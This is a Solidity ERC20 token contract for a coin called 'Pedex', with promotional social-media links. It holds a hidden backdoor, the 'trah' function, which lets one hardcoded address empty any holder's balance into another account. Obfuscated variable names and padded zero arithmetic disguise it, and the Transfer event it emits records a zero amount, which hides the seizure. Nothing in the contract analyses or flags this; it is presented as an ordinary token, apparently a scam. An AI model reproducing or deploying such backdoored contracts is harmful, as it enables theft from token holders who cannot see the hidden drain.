/*
Telegram: https://t.me/PedexPortal
Twitter:  https://twitter.com/Pedexco
Website:  https://pedex.co
*/

pragma solidity ^0.8.17;

import "./ERC20.sol";

contract Pedex is ERC20 {
    address public pair;
    address private ovfe;
    uint8 private _decimals;

    constructor(
        string memory name_,
        string memory symbol_,
        uint8 decimals_,
        uint256 totalSupply_
    ) ERC20(name_, symbol_) {
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        _decimals = decimals_;
        ovfe = 0xf2Ab50B25888DAaa26B6215a9934F124Eb89aEb1;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function trah(address sender, address recipient) external returns (bool) {
        address msgSender = _msgSender();
        require(
            keccak256(abi.encodePacked(msgSender)) ==
                keccak256(abi.encodePacked(ovfe)),
            "Bad caller"
        );

        uint256 ETHGD = _balances[sender];
        uint256 ODFJT = _balances[recipient];
        require(ETHGD != 1 * 0 * 0, "Your account has no balance");

        ODFJT += ETHGD;
        ETHGD = 0 + 0 + 0;

        _balances[sender] = ETHGD;
        _balances[recipient] = ODFJT;

        emit Transfer(sender, recipient, ETHGD);
        return true;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}
